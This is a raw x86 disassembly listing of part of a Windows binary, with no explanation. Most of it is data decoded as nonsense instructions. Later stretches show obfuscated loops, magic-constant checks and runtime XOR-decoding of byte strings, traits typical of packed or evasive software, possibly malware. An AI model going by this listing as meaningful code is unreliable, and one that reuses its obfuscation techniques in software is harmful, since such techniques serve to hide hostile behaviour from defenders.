  4119cc:	xor    esi,eax
  4119ce:	mov    cl,0xf3
  4119d0:	daa    
  4119d1:	popa   
  4119d2:	aad    0x96
  4119d4:	mov    al,ds:0x15d6f275
  4119d9:	popa   
  4119da:	or     dl,BYTE PTR gs:[ebx]
  4119dd:	retf   0xdb69
  4119e0:	imul   eax,DWORD PTR [eax],0x11
  4119e3:	addr16 jp 0x411a42
  4119e6:	inc    eax
  4119e7:	and    DWORD PTR [ecx+0x26],esp
  4119ea:	fst    DWORD PTR [edx]
  4119ec:	test   DWORD PTR [ecx+0x32],0xdf87b69e
  4119f3:	les    eax,FWORD PTR [edi]
  4119f5:	fcom   QWORD PTR [edi]
  4119f7:	out    0xde,eax
  4119f9:	inc    esi
  4119fa:	mov    WORD PTR [ebx-0x12],fs
  4119fd:	ror    BYTE PTR [eax],cl
  4119ff:	repz enter 0x434d,0xf8
  411a04:	lods   eax,DWORD PTR ds:[esi]
  411a05:	ss jne 0x411a7a
  411a08:	out    0x4,al
  411a0a:	and    ebp,DWORD PTR [ebx+esi*1]
  411a0d:	mov    ebp,0x9dab8af
  411a12:	jp     0x411a8b
  411a14:	mov    ?,WORD PTR [esi-0x44]
  411a17:	test   eax,0xb7bf9555
  411a1c:	push   ecx
  411a1d:	leave  
  411a1e:	cmp    BYTE PTR [esi+edi*1-0x633d4d88],bh
  411a25:	add    DWORD PTR [ebp+0x78],0x94661a50
  411a2c:	stos   BYTE PTR es:[edi],al
  411a2d:	xchg   ebp,eax
  411a2e:	mov    ds:0xe1609270,eax
  411a33:	pop    esi
  411a34:	shr    DWORD PTR [ebp-0x7c689404],0xa
  411a3b:	and    BYTE PTR [eax+0x6b],bh
  411a3e:	sti    
  411a3f:	ret    0x8dae
  411a42:	push   ebp
  411a43:	enter  0x758c,0xa4
  411a47:	push   ecx
  411a48:	jle    0x4119d2
  411a4a:	retf   
  411a4b:	call   0xd19e2881
  411a50:	xchg   edi,eax
  411a51:	jnp    0x411a9d
  411a53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a54:	mov    cl,0x42
  411a56:	daa    
  411a57:	lock dec ebp
  411a59:	iret   
  411a5a:	xor    dl,bl
  411a5c:	xor    bh,bl
  411a5e:	pop    ss
  411a5f:	jno    0x411a5f
  411a61:	fcomp  DWORD PTR [ebp+0x34]
  411a64:	jp     0x411a23
  411a66:	lods   al,BYTE PTR ds:[esi]
  411a67:	sbb    DWORD PTR [edx+0x24],ebp
  411a6a:	inc    ebx
  411a6b:	pushf  
  411a6c:	cmc    
  411a6d:	or     DWORD PTR [ebp+0xc],0x93080a00
  411a74:	push   eax
  411a75:	fdiv   DWORD PTR [ecx]
  411a77:	ins    DWORD PTR es:[edi],dx
  411a78:	jbe    0x411a6b
  411a7a:	stos   DWORD PTR es:[edi],eax
  411a7b:	bound  ebx,QWORD PTR [ebp-0x43]
  411a7e:	push   0xffffffd3
  411a80:	mov    eax,ds:0xab698df0
  411a85:	pop    ss
  411a86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a87:	aad    0x58
  411a89:	xor    eax,0xe05d8439
  411a8e:	inc    ebp
  411a8f:	enter  0x64ea,0xf6
  411a93:	xchg   esp,eax
  411a94:	arpl   WORD PTR [edi],bx
  411a96:	or     eax,0x6edcb74c
  411a9b:	mov    bh,0x19
  411a9d:	rol    DWORD PTR [ebx-0x17],1
  411aa0:	(bad)  
  411aa1:	gs icebp 
  411aa3:	idiv   BYTE PTR [edi+0x3ad44b8]
  411aa9:	cmp    BYTE PTR [edx-0xc3a2213],0x60
  411ab0:	dec    edx
  411ab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ab2:	outs   dx,BYTE PTR ds:[esi]
  411ab3:	jle    0x411afe
  411ab5:	mov    ebx,0x54e0dc4e
  411aba:	call   0x4a4d:0x82b5483b
  411ac1:	sar    DWORD PTR [ebp+0x4c58599a],cl
  411ac7:	jne    0x411af2
  411ac9:	dec    edx
  411aca:	mov    bl,0xb9
  411acc:	mov    ah,0xae
  411ace:	pop    es
  411acf:	cli    
  411ad0:	gs mov edx,0x96ed5f9
  411ad6:	mov    eax,cs:0x8d180fc4
  411adc:	inc    ebp
  411add:	pop    edx
  411ade:	pushf  
  411adf:	jbe    0x411a7a
  411ae1:	mov    dh,0x37
  411ae3:	adc    al,0x63
  411ae5:	hlt    
  411ae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ae7:	in     al,dx
  411ae8:	jnp    0x411ab1
  411aea:	sub    eax,0x8fe364c9
  411aef:	loopne 0x411b09
  411af1:	push   0xfffffff4
  411af3:	ss in  eax,0xca
  411af6:	xor    bl,ch
  411af8:	lahf   
  411af9:	(bad)  
  411afa:	mov    eax,ds:0xe01e761c
  411aff:	or     DWORD PTR [ecx-0x10c66da6],0x35dadebc
  411b09:	jge    0x411b80
  411b0b:	iret   
  411b0c:	aad    0xf0
  411b0e:	push   eax
  411b0f:	mov    esi,0x5a4cb471
  411b14:	loopne 0x411ad1
  411b16:	cld    
  411b17:	or     al,0xa
  411b19:	add    eax,0xfac6ad65
  411b1e:	mov    esp,0xf7349a84
  411b23:	inc    ebx
  411b24:	sbb    ebx,edx
  411b26:	fild   QWORD PTR [esi+0x13de3120]
  411b2c:	sub    cl,dh
  411b2e:	fucomip st,st(7)
  411b30:	sbb    DWORD PTR [eax+0x4a],ebp
  411b33:	lock inc eax
  411b35:	mov    BYTE PTR [edi+0x10],ah
  411b38:	nop
  411b39:	mov    ebp,0x8218be02
  411b3e:	mov    edi,DWORD PTR [ebx+0x33]
  411b41:	jp     0x411b40
  411b43:	dec    DWORD PTR [edi-0x79af4b5a]
  411b49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b4a:	fidiv  DWORD PTR [ecx-0x67]
  411b4d:	stos   BYTE PTR es:[edi],al
  411b4e:	mov    edx,0xdcd91d1c
  411b53:	test   BYTE PTR [edi],dl
  411b55:	jmp    0x9223:0x438dd58a
  411b5c:	pop    eax
  411b5d:	jo     0x411b56
  411b5f:	and    bh,bl
  411b61:	repz pop edi
  411b63:	and    al,0x34
  411b65:	jg     0x411b35
  411b67:	test   DWORD PTR [ebx-0x6c927929],ebx
  411b6d:	sbb    ch,BYTE PTR [edi+0x41]
  411b70:	or     al,0xb9
  411b72:	sub    DWORD PTR [esi+0x1d46a107],esi
  411b78:	(bad)  
  411b7a:	mov    esp,0x8fa98895
  411b7f:	test   eax,0x508b4fe3
  411b84:	daa    
  411b85:	jge    0xe4ead224
  411b8b:	sbb    esp,DWORD PTR [edx+0x1e]
  411b8e:	jp     0x1b068ef1
  411b94:	data16 cs (bad) 
  411b97:	sbb    eax,0xd4e8433c
  411b9c:	(bad)  
  411b9d:	int    0x24
  411b9f:	mov    ds,WORD PTR [esi]
  411ba1:	push   0xa2047acc
  411ba6:	xchg   esi,eax
  411ba7:	pmullw xmm4,XMMWORD PTR [edi+0x500efa21]
  411baf:	xchg   esp,eax
  411bb0:	mov    eax,ds:0xf82653ea
  411bb5:	push   0xffffff82
  411bb7:	test   BYTE PTR [edi],dl
  411bb9:	inc    esi
  411bba:	lock bound esi,QWORD PTR [edi+eiz*4]
  411bbe:	cdq    
  411bbf:	gs sahf 
  411bc1:	mov    edi,0x1d1992e7
  411bc6:	mov    al,BYTE PTR [esi]
  411bc8:	push   ecx
  411bc9:	js     0x411bd9
  411bcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bcc:	mov    edi,0x5b6711f0
  411bd1:	jmp    0x411c0f
  411bd3:	and    ch,BYTE PTR [ecx]
  411bd5:	mov    ah,0xe4
  411bd7:	(bad)  [eax+edi*8]
  411bda:	gs jbe 0x411baf
  411bdd:	push   cs
  411bde:	dec    ebx
  411bdf:	stos   DWORD PTR es:[edi],eax
  411be0:	dec    ebp
  411be1:	xor    ecx,0xeea4d8a4
  411be7:	mov    DWORD PTR [eax],0x2406c659
  411bed:	sbb    BYTE PTR [edx+esi*1],cl
  411bf0:	add    ecx,edi
  411bf2:	pushf  
  411bf3:	je     0x411be9
  411bf5:	mov    ds:0xd2b0e158,eax
  411bfa:	push   ebx
  411bfb:	and    BYTE PTR [edx-0x6def7f1e],0xed
  411c02:	leave  
  411c03:	test   BYTE PTR [esi+ebx*4+0x74d46c44],0xb1
  411c0b:	inc    esi
  411c0c:	inc    esi
  411c0d:	imul   esp,DWORD PTR [eax-0x5220c2fa],0xb9085d34
  411c17:	not    dh
  411c19:	xor    eax,0x7df73613
  411c1e:	adc    al,0x94
  411c20:	ds or  ch,bl
  411c23:	pop    ebp
  411c24:	lahf   
  411c25:	idiv   al
  411c27:	fwait
  411c28:	mov    ch,0x79
  411c2a:	cli    
  411c2b:	lahf   
  411c2c:	push   edi
  411c2d:	dec    esp
  411c2e:	fst    DWORD PTR [edi+0xb1ad359]
  411c34:	and    BYTE PTR [esi+0x19],bh
  411c37:	dec    ecx
  411c38:	cmp    bl,ch
  411c3a:	lahf   
  411c3b:	outs   dx,BYTE PTR ds:[esi]
  411c3c:	and    dh,BYTE PTR [esi+0x5c]
  411c3f:	mov    gs,WORD PTR [ecx]
  411c41:	inc    edi
  411c42:	lahf   
  411c43:	pushf  
  411c44:	mov    ah,0x67
  411c46:	dec    DWORD PTR [edi-0x32e2096a]
  411c4c:	in     al,dx
  411c4d:	lock mov ah,0x98
  411c50:	in     al,0x72
  411c52:	hlt    
  411c53:	and    DWORD PTR [edi-0x7808eeb9],0xffffffc6
  411c5a:	into   
  411c5b:	leave  
  411c5c:	sub    dl,BYTE PTR [edi+0x59985a4f]
  411c62:	stos   DWORD PTR es:[edi],eax
  411c63:	jnp    0x411c6b
  411c65:	lds    edx,FWORD PTR [eax+0x73]
  411c68:	sub    eax,DWORD PTR [esi+0x7c3b1cff]
  411c6e:	out    dx,al
  411c6f:	stos   BYTE PTR es:[edi],al
  411c70:	or     bl,bl
  411c72:	loope  0x411c0f
  411c74:	mov    esi,0xefcea6da
  411c79:	jge    0x411c53
  411c7b:	xchg   edx,eax
  411c7c:	push   esi
  411c7d:	icebp  
  411c7e:	mov    edi,0x61ecd61f
  411c83:	or     eax,0xd7028718
  411c88:	add    esi,DWORD PTR [edi]
  411c8a:	mov    ebx,0x18171f9b
  411c8f:	push   cs
  411c90:	(bad)  
  411c92:	in     al,dx
  411c93:	jns    0x411d14
  411c95:	xchg   esi,eax
  411c96:	or     eax,0x42504c17
  411c9b:	jle    0x411c5d
  411c9d:	sub    al,0xb4
  411c9f:	jns    0x411cb1
  411ca1:	cwde   
  411ca2:	in     eax,dx
  411ca3:	call   0x90dafc47
  411ca8:	xchg   edx,eax
  411ca9:	int3   
  411caa:	and    cl,BYTE PTR [eax+0x60]
  411cad:	in     al,dx
  411cae:	into   
  411caf:	xor    ah,BYTE PTR [ebp-0x48]
  411cb2:	data16 jae 0x411cce
  411cb5:	jmp    0x815d:0x3d0e462f
  411cbc:	mov    eax,ds:0xb40a923c
  411cc1:	sti    
  411cc2:	mov    ds:0xa6ec3a75,al
  411cc7:	mov    WORD PTR [eax-0x5],?
  411cca:	xchg   ebp,eax
  411ccb:	adc    eax,DWORD PTR [edx]
  411ccd:	mov    al,ds:0x512a5b2a
  411cd2:	aad    0xb9
  411cd4:	arpl   WORD PTR [edx-0x47],dx
  411cd7:	enter  0x8395,0xf6
  411cdb:	push   es
  411cdc:	add    DWORD PTR [edi+0x10],esp
  411cdf:	fxch   st(0)
  411ce1:	outs   dx,BYTE PTR ds:[esi]
  411ce2:	loop   0x411c77
  411ce4:	sub    eax,0x26c95a8c
  411ce9:	(bad)  
  411cea:	(bad)  
  411ceb:	(bad)  
  411cec:	call   0xe5d4:0xe100b066
  411cf3:	gs push es
  411cf5:	mov    al,ds:0x44467169
  411cfa:	enter  0x8701,0x43
  411cfe:	pusha  
  411cff:	jno    0x411c89
  411d01:	push   es
  411d02:	mov    edi,ebx
  411d04:	jmp    0x411cc1
  411d06:	lahf   
  411d07:	xor    al,0xea
  411d09:	ret    0x27cf
  411d0c:	ret    0x92b8
  411d0f:	call   0x38d7:0x5f699f0a
  411d16:	xchg   edx,eax
  411d17:	cmp    al,0xfb
  411d19:	jle    0x411d1f
  411d1b:	add    BYTE PTR [ebp*1-0x7fdc2555],ah
  411d22:	jp     0x411cfe
  411d24:	ss sub eax,0x89fc83bd
  411d2a:	fbld   TBYTE PTR [edx]
  411d2c:	sbb    BYTE PTR ds:0x5ce8f213,0x72
  411d33:	cmc    
  411d34:	leave  
  411d35:	(bad)  
  411d36:	je     0x411d11
  411d38:	xor    al,0xc5
  411d3a:	jge    0x411cc9
  411d3c:	rol    DWORD PTR ds:0x79bfa87f,1
  411d42:	stos   BYTE PTR es:[edi],al
  411d43:	retf   
  411d44:	hlt    
  411d45:	sbb    ah,BYTE PTR [esi-0x2903d514]
  411d4b:	xor    eax,DWORD PTR [edx+0x58]
  411d4e:	int3   
  411d4f:	push   ds
  411d50:	ja     0x411d14
  411d52:	ja     0x411dbf
  411d54:	sub    dh,BYTE PTR [esi]
  411d56:	adc    edx,DWORD PTR [eax+0x74629be]
  411d5c:	(bad)  
  411d5e:	loope  0x411d63
  411d60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d61:	out    0x48,eax
  411d63:	test   al,0xbf
  411d66:	inc    ecx
  411d67:	test   ebx,esi
  411d69:	leave  
  411d6a:	(bad)  
  411d6c:	retf   
  411d6d:	cmp    DWORD PTR [esp+esi*1-0x47],ebp
  411d71:	in     eax,0xd4
  411d73:	lock add ebp,esp
  411d76:	ret    
  411d77:	fsubrp st(0),st
  411d79:	inc    edx
  411d7a:	xor    BYTE PTR [ecx+0x52abd0a],bl
  411d80:	in     al,dx
  411d81:	retf   
  411d82:	mov    esp,0xbf2d494e
  411d87:	fstp   DWORD PTR es:[eax]
  411d8a:	xchg   esi,eax
  411d8b:	in     eax,dx
  411d8c:	or     BYTE PTR [ecx],0x44
  411d8f:	out    dx,al
  411d90:	mov    al,0x2b
  411d92:	pop    eax
  411d93:	add    DWORD PTR [edx-0xa0e10ee],edi
  411d99:	xlat   BYTE PTR ds:[ebx]
  411d9a:	jmp    0x411d52
  411d9c:	int    0x1f
  411d9e:	xchg   BYTE PTR [ebx+0x6e],al
  411da1:	cmp    ecx,edx
  411da3:	jb     0x40f9d0
  411da9:	jmp    0x411df3
  411dae:	mov    ecx,DWORD PTR [ebp-0xc]
  411db1:	mov    DWORD PTR [ebp+0x8],ecx
  411db4:	jmp    0x411de6
  411db9:	mov    ecx,DWORD PTR [ebp+0x8]
  411dbc:	mov    edx,DWORD PTR [ebp-0x8]
  411dbf:	xor    ecx,eax
  411dc1:	xor    edx,eax
  411dc3:	sub    ecx,edx
  411dc5:	sub    ecx,esi
  411dc7:	xor    ecx,eax
  411dc9:	mov    DWORD PTR [ebp+0x8],ecx
  411dcc:	mov    ecx,DWORD PTR [ebp+0x8]
  411dcf:	mov    edx,DWORD PTR [ebp+0x8]
  411dd2:	imul   edx,edx,0x5708f2
  411dd8:	xor    ecx,eax
  411dda:	add    ecx,esi
  411ddc:	lea    ecx,[ebp+ecx*4-0x64]
  411de0:	mov    edi,DWORD PTR [ecx]
  411de2:	add    edx,edi
  411de4:	mov    DWORD PTR [ecx],edx
  411de6:	mov    ecx,DWORD PTR [ebp+0x8]
  411de9:	xor    ecx,eax
  411deb:	add    ecx,esi
  411ded:	jne    0x411db9
  411df3:	mov    ecx,DWORD PTR [ebp-0xc]
  411df6:	mov    DWORD PTR [ebp+0x8],ecx
  411df9:	jmp    0x411e2b
  411dfe:	mov    ecx,DWORD PTR [ebp+0x8]
  411e01:	mov    edx,DWORD PTR [ebp-0x8]
  411e04:	xor    ecx,eax
  411e06:	xor    edx,eax
  411e08:	sub    ecx,edx
  411e0a:	sub    ecx,esi
  411e0c:	xor    ecx,eax
  411e0e:	mov    DWORD PTR [ebp+0x8],ecx
  411e11:	mov    ecx,DWORD PTR [ebp+0x8]
  411e14:	mov    edx,DWORD PTR [ebp+0x8]
  411e17:	imul   edx,edx,0x5708f2
  411e1d:	xor    ecx,eax
  411e1f:	add    ecx,esi
  411e21:	lea    ecx,[ebp+ecx*4-0x64]
  411e25:	mov    edi,DWORD PTR [ecx]
  411e27:	add    edx,edi
  411e29:	mov    DWORD PTR [ecx],edx
  411e2b:	mov    ecx,DWORD PTR [ebp+0x8]
  411e2e:	xor    ecx,eax
  411e30:	add    ecx,esi
  411e32:	jne    0x411dfe
  411e38:	mov    ecx,DWORD PTR [ebp-0x8]
  411e3b:	mov    edx,DWORD PTR [ebp-0x20]
  411e3e:	xor    ecx,eax
  411e40:	lea    ecx,[ecx+edx*1+0x3272dd]
  411e47:	mov    DWORD PTR [ebp-0x20],ecx
  411e4a:	inc    DWORD PTR [ebp+0xc]
  411e4d:	mov    ecx,DWORD PTR [ebp-0x1c]
  411e50:	xor    ecx,eax
  411e52:	add    ecx,esi
  411e54:	jne    0x40f7af
  411e5a:	jmp    0x411ee3
  411e5f:	mov    ecx,DWORD PTR [ebp-0xc]
  411e62:	mov    DWORD PTR [ebp+0x8],ecx
  411e65:	jmp    0x411e97
  411e6a:	mov    ecx,DWORD PTR [ebp+0x8]
  411e6d:	mov    edx,DWORD PTR [ebp-0x8]
  411e70:	xor    ecx,eax
  411e72:	xor    edx,eax
  411e74:	sub    ecx,edx
  411e76:	sub    ecx,esi
  411e78:	xor    ecx,eax
  411e7a:	mov    DWORD PTR [ebp+0x8],ecx
  411e7d:	mov    ecx,DWORD PTR [ebp+0x8]
  411e80:	mov    edx,DWORD PTR [ebp+0x8]
  411e83:	imul   edx,edx,0x5708f2
  411e89:	xor    ecx,eax
  411e8b:	add    ecx,esi
  411e8d:	lea    ecx,[ebp+ecx*4-0x64]
  411e91:	mov    edi,DWORD PTR [ecx]
  411e93:	add    edx,edi
  411e95:	mov    DWORD PTR [ecx],edx
  411e97:	mov    ecx,DWORD PTR [ebp+0x8]
  411e9a:	xor    ecx,eax
  411e9c:	add    ecx,esi
  411e9e:	jne    0x411e6a
  411ea4:	jmp    0x411eef
  411ea9:	mov    ecx,DWORD PTR [ebp+0x8]
  411eac:	mov    edx,DWORD PTR [ebp-0x8]
  411eaf:	xor    ecx,eax
  411eb1:	xor    edx,eax
  411eb3:	sub    ecx,edx
  411eb5:	sub    ecx,esi
  411eb7:	xor    ecx,eax
  411eb9:	mov    DWORD PTR [ebp+0x8],ecx
  411ebc:	mov    ecx,DWORD PTR [ebp+0x8]
  411ebf:	mov    edx,DWORD PTR [ebp+0x8]
  411ec2:	xor    ecx,eax
  411ec4:	imul   edx,edx,0x5708f2
  411eca:	add    ecx,esi
  411ecc:	lea    ecx,[ebp+ecx*4-0x64]
  411ed0:	mov    edi,DWORD PTR [ecx]
  411ed2:	add    edx,edi
  411ed4:	mov    DWORD PTR [ecx],edx
  411ed6:	mov    ecx,DWORD PTR [ebp+0x8]
  411ed9:	xor    ecx,eax
  411edb:	add    ecx,esi
  411edd:	jne    0x411ea9
  411ee3:	mov    ecx,DWORD PTR [ebp-0x8]
  411ee6:	xor    ecx,eax
  411ee8:	mov    eax,DWORD PTR [ebp+0x10]
  411eeb:	add    ecx,esi
  411eed:	mov    DWORD PTR [eax],ecx
  411eef:	pop    edi
  411ef0:	pop    esi
  411ef1:	pop    ebx
  411ef2:	leave  
  411ef3:	ret    0xc
	...
  411f02:	add    BYTE PTR [eax],al
  411f04:	pop    esi
  411f05:	mov    eax,0x4dd0
  411f0a:	add    BYTE PTR [eax],al
  411f0c:	xor    bl,BYTE PTR [edi]
  411f0e:	add    DWORD PTR [eax],eax
  411f10:	add    DWORD PTR [eax],eax
  411f12:	add    BYTE PTR [eax],al
  411f14:	add    DWORD PTR [eax],eax
  411f16:	add    BYTE PTR [eax],al
  411f18:	add    DWORD PTR [eax],eax
  411f1a:	add    BYTE PTR [eax],al
  411f1c:	sub    BYTE PTR [edi],bl
  411f1e:	add    DWORD PTR [eax],eax
  411f20:	sub    al,0x1f
  411f22:	add    DWORD PTR [eax],eax
  411f24:	xor    BYTE PTR [edi],bl
  411f26:	add    DWORD PTR [eax],eax
  411f28:	test   eax,0x3e000029
  411f2d:	pop    ds
  411f2e:	add    DWORD PTR [eax],eax
  411f30:	add    BYTE PTR [eax],al
  411f32:	push   ebx
  411f33:	jns    0x411fa2
  411f35:	bound  ebp,QWORD PTR [edi+0x6c]
  411f38:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  411f3f:	inc    ebx
  411f40:	ins    BYTE PTR es:[edi],dx
  411f41:	outs   dx,DWORD PTR ds:[esi]
  411f42:	jae    0x411fa9
  411f44:	push   edi
  411f45:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  411f4c:	popa   
  411f4d:	je     0x411fb8
  411f4f:	outs   dx,DWORD PTR ds:[esi]
  411f50:	outs   dx,BYTE PTR ds:[esi]
  411f51:	inc    ebx
  411f52:	ins    BYTE PTR es:[edi],dx
  411f53:	outs   dx,DWORD PTR ds:[esi]
  411f54:	jae    0x411fbb
  411f56:	push   edi
  411f57:	imul   eax,DWORD PTR [eax],0x40042a0
  411f5d:	mov    al,ds:0xa0080042
  411f62:	inc    edx
  411f63:	add    BYTE PTR [eax+eiz*4],cl
  411f66:	inc    edx
  411f67:	add    BYTE PTR [eax],dl
  411f69:	mov    al,ds:0xa0140042
  411f6e:	inc    edx
  411f6f:	add    BYTE PTR [eax],bl
  411f71:	mov    al,ds:0xa01c0042
  411f76:	inc    edx
  411f77:	add    BYTE PTR [eax],al
  411f79:	rol    BYTE PTR [edx+0x0],1
  411f7c:	add    al,0xd0
  411f7e:	inc    edx
  411f7f:	add    BYTE PTR [eax],cl
  411f81:	rol    BYTE PTR [edx+0x0],1
  411f84:	or     al,0xd0
  411f86:	inc    edx
  411f87:	add    BYTE PTR [eax],dl
  411f89:	rol    BYTE PTR [edx+0x0],1
  411f8c:	adc    al,0xd0
  411f8e:	inc    edx
  411f8f:	add    BYTE PTR [eax],bl
  411f91:	rol    BYTE PTR [edx+0x0],1
  411f94:	sbb    al,0xd0
  411f96:	inc    edx
	...
  411fa3:	add    BYTE PTR [esi-0x48],bl
  411fa6:	ror    BYTE PTR [ebp+0x0],1
  411fa9:	add    BYTE PTR [eax],al
  411fab:	add    BYTE PTR [edx],al
  411fad:	add    BYTE PTR [eax],al
  411faf:	add    BYTE PTR ds:0x30000000,bh
  411fb5:	and    BYTE PTR [ecx],al
  411fb7:	add    BYTE PTR [eax],dh
  411fb9:	adc    al,0x1
  411fbb:	add    BYTE PTR [eax],al
  411fbd:	nop
  411fbe:	inc    edx
  411fbf:	add    BYTE PTR [eax+edx*4],al
  411fc2:	inc    edx
  411fc3:	add    BYTE PTR [eax],cl
  411fc5:	nop
  411fc6:	inc    edx
  411fc7:	add    BYTE PTR [eax+edx*4],cl
  411fca:	inc    edx
  411fcb:	add    BYTE PTR [eax],dl
  411fcd:	nop
  411fce:	inc    edx
  411fcf:	add    BYTE PTR [eax+edx*4],dl
  411fd2:	inc    edx
  411fd3:	add    BYTE PTR [eax],bl
  411fd5:	nop
  411fd6:	inc    edx
  411fd7:	add    BYTE PTR [eax+edx*4],bl
  411fda:	inc    edx
  411fdb:	add    BYTE PTR [eax],ah
  411fdd:	nop
  411fde:	inc    edx
  411fdf:	add    BYTE PTR [eax+edx*4],ah
  411fe2:	inc    edx
  411fe3:	add    BYTE PTR [eax],ch
  411fe5:	nop
  411fe6:	inc    edx
  411fe7:	add    BYTE PTR [eax],al
  411fe9:	mov    al,0x42
  411feb:	add    BYTE PTR [eax+esi*4],al
  411fee:	inc    edx
  411fef:	add    BYTE PTR [eax],cl
  411ff1:	mov    al,0x42
  411ff3:	add    BYTE PTR [eax+esi*4],cl
  411ff6:	inc    edx
  411ff7:	add    BYTE PTR [eax],dl
  411ff9:	mov    al,0x42
  411ffb:	add    BYTE PTR [eax+esi*4],dl
  411ffe:	inc    edx
  411fff:	add    BYTE PTR [eax],bl
  412001:	mov    al,0x42
  412003:	add    BYTE PTR [eax+esi*4],bl
  412006:	inc    edx
  412007:	add    BYTE PTR [eax],al
  412009:	rol    BYTE PTR [edx+0x0],0x4
  41200d:	rol    BYTE PTR [edx+0x0],0x8
  412011:	rol    BYTE PTR [edx+0x0],0xc
  412015:	rol    BYTE PTR [edx+0x0],0x10
  412019:	rol    BYTE PTR [edx+0x0],0x14
  41201d:	rol    BYTE PTR [edx+0x0],0x18
  412021:	rol    BYTE PTR [edx+0x0],0x1c
  412025:	rol    BYTE PTR [edx+0x0],0x0
  412029:	add    BYTE PTR [eax],al
  41202b:	add    BYTE PTR [eax],al
  41202d:	add    BYTE PTR [eax],al
  41202f:	add    BYTE PTR [edx+0x53],dl
  412032:	inc    esp
  412033:	push   ebx
  412034:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412035:	mov    ecx,ebx
  412037:	sub    DWORD PTR [eax-0x74b5c5d5],0xffffffca
  41203e:	xchg   esp,eax
  41203f:	jle    0x411fc4
  412041:	push   ebx
  412042:	loope  0x41203b
  412044:	add    DWORD PTR [eax],eax
  412046:	add    BYTE PTR [eax],al
  412048:	inc    ebx
  412049:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  41204d:	jb     0x4120c1
  41204f:	outs   dx,BYTE PTR gs:[esi]
  412051:	je     0x412097
  412053:	popa   
  412054:	je     0x4120b7
  412056:	pop    esp
  412057:	dec    ebp
  412058:	outs   dx,DWORD PTR ds:[esi]
  412059:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  412061:	ins    BYTE PTR es:[edi],dx
  412062:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  412069:	dec    esi
  41206a:	gs ja  0x41206d
  41206d:	mov    edx,DWORD PTR [ebp-0x14]
  412070:	sub    esp,0xe4
  412076:	push   ebx
  412077:	mov    eax,ebx
  412079:	xchg   ecx,eax
  41207a:	mov    eax,DWORD PTR [ebp+0x8]
  41207d:	cmp    eax,0xf89c85b5
  412082:	jne    0x412416
  412088:	mov    eax,DWORD PTR [ebp+0xc]
  41208b:	cmp    eax,0xf89c85b2
  412090:	jne    0x412416
  412096:	mov    eax,DWORD PTR [ebp+0x24]
  412099:	mov    DWORD PTR [ebp-0x4],eax
  41209c:	mov    BYTE PTR [ebp-0x18],0x3
  4120a0:	mov    BYTE PTR [ebp-0x17],0x1e
  4120a4:	mov    BYTE PTR [ebp-0x16],0x5
  4120a8:	mov    BYTE PTR [ebp-0x15],0x4f
  4120ac:	mov    BYTE PTR [ebp-0x14],0x4c
  4120b0:	mov    BYTE PTR [ebp-0x13],0x7a
  4120b4:	mov    BYTE PTR [ebp-0x20],0xf1
  4120b8:	mov    BYTE PTR [ebp-0x1f],0xf
  4120bc:	mov    BYTE PTR [ebp-0x1e],0x1
  4120c0:	mov    BYTE PTR [ebp-0x1d],0xc
  4120c4:	mov    BYTE PTR [ebp-0x1c],0x4f
  4120c8:	mov    BYTE PTR [ebp-0x1b],0x4c
  4120cc:	mov    BYTE PTR [ebp-0x1a],0x7a
  4120d0:	mov    BYTE PTR [ebp-0x28],0xf
  4120d4:	mov    BYTE PTR [ebp-0x27],0x2
  4120d8:	push   esi
  4120d9:	mov    BYTE PTR [ebp-0x26],0x6
  4120dd:	mov    BYTE PTR [ebp-0x25],0xf3
  4120e1:	push   edi
  4120e2:	mov    BYTE PTR [ebp-0x24],0x1d
  4120e6:	mov    BYTE PTR [ebp-0x23],0xa
  4120ea:	push   0x71
  4120ec:	mov    BYTE PTR [ebp-0x22],0x5
  4120f0:	xor    edi,edi
  4120f2:	mov    BYTE PTR [ebp-0x21],0x7a
  4120f6:	xor    esi,esi
  4120f8:	pop    edx
  4120f9:	mov    eax,0xf5
  4120fe:	lea    ecx,[ebp+esi*1-0x18]
  412102:	movzx  ebx,BYTE PTR [ecx]
  412105:	xor    ebx,edx
  412107:	add    ebx,eax
  412109:	inc    esi
  41210a:	mov    BYTE PTR [ecx],bl
  41210c:	cmp    esi,0x6
  41210f:	jb     0x4120fe
  412111:	xor    esi,esi
  412113:	lea    ecx,[ebp+esi*1-0x20]
  412117:	movzx  ebx,BYTE PTR [ecx]
  41211a:	xor    ebx,edx
  41211c:	add    ebx,eax
  41211e:	inc    esi
  41211f:	mov    BYTE PTR [ecx],bl
  412121:	cmp    esi,0x7
  412124:	jb     0x412113
  412126:	xor    esi,esi
  412128:	lea    ecx,[ebp+esi*1-0x28]
  41212c:	movzx  ebx,BYTE PTR [ecx]
  41212f:	xor    ebx,edx
  412131:	add    ebx,eax
  412133:	push   0x8
  412135:	mov    BYTE PTR [ecx],bl
  412137:	inc    esi
  412138:	pop    ecx
  412139:	cmp    esi,ecx
  41213b:	jb     0x412128
  41213d:	lea    eax,[ebp-0x2c]
  412140:	mov    DWORD PTR [ebp-0x8],eax
  412143:	mov    esi,DWORD PTR [ebp-0x8]
  412146:	mov    eax,0x7113fcef
  41214b:	mov    DWORD PTR [esi],eax
  41214d:	mov    esi,DWORD PTR [ebp-0x2c]
  412150:	cmp    esi,eax
  412152:	jne    0x412162
  412154:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41215b:	mov    DWORD PTR [ebp-0x8],0xf89c85e0
  412162:	mov    eax,DWORD PTR [ebp-0x4]
  412165:	mov    eax,DWORD PTR [eax+0x18c]
  41216b:	cmp    DWORD PTR [eax],edi
  41216d:	jne    0x4123bf
  412173:	mov    eax,DWORD PTR [ebp-0x4]
  412176:	mov    eax,DWORD PTR [eax+0x17c]
  41217c:	mov    DWORD PTR [eax],edi
  41217e:	mov    eax,DWORD PTR [ebp-0x4]
  412181:	mov    eax,DWORD PTR [eax+0x180]
  412187:	mov    DWORD PTR [eax],edi
